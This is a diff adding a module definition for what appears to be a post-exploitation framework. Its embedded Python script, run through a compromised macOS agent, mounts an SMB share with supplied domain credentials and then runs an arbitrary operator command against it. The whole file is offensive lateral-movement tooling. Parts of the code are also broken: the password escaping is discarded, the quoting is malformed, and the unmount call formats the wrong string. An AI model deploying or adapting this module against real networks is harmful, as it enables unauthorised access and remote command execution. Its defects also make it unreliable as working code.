@@ -1,0 +1,76 @@
+name: SMB Mount
+authors:
+  - '@424f424f'
+description: This module will attempt mount an smb share and execute a command on
+  it.
+software: ''
+techniques:
+  - T1135
+background: false
+output_extension: ''
+needs_admin: false
+opsec_safe: false
+language: python
+min_language_version: '2.6'
+comments:
+  - ''
+options:
+  - name: Agent
+    description: Agent to run on.
+    required: true
+    value: ''
+  - name: Domain
+    description: Domain
+    required: false
+    value: ''
+  - name: UserName
+    description: Username
+    required: true
+    value: ''
+  - name: Password
+    description: Password
+    required: false
+    value: ''
+  - name: ShareName
+    description: Share to mount. e.g. 192.168.1.1/c$
+    required: true
+    value: ''
+  - name: MountPoint
+    description: Directory to mount on target.
+    required: true
+    value: ''
+  - name: Command
+    description: Command to run.
+    required: true
+    value: ''
+script: |
+  import sys, os, subprocess, re
+
+  username = "{{ UserName }}"
+  domain = "{{ Domain }}"
+  password = "{{ Password }}"
+  sharename = "{{ ShareName }}"
+  mountpoint = "{{ MountPoint }}"
+  command = "{{ Command }}"
+  password.replace('!','%%21')
+  password.replace('#','%%23')
+  password.replace('$','%%24')
+
+
+  cmd = \"""mkdir /Volumes/{}\""".format(mountpoint)
+  subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
+
+  cmd1 = \"""mount_smbfs //'{};{}:{}'@{} /Volumes/{}""\".format(domain,username,password,sharename,mountpoint)
+  print(subprocess.Popen(cmd1, shell=True, stdout=subprocess.PIPE).stdout.read())
+  print("")
+
+  cmd2 = \"""{} /Volumes/{}""\".format(command,mountpoint)
+  print(subprocess.Popen(cmd2, shell=True, stdout=subprocess.PIPE).stdout.read())
+  print("")
+
+
+
+  print("")
+  print(subprocess.Popen('diskutil unmount force /Volumes/{}', shell=True, stdout=subprocess.PIPE).stdout.read().format(mountpoint))
+  print("")
+  print("Finished")
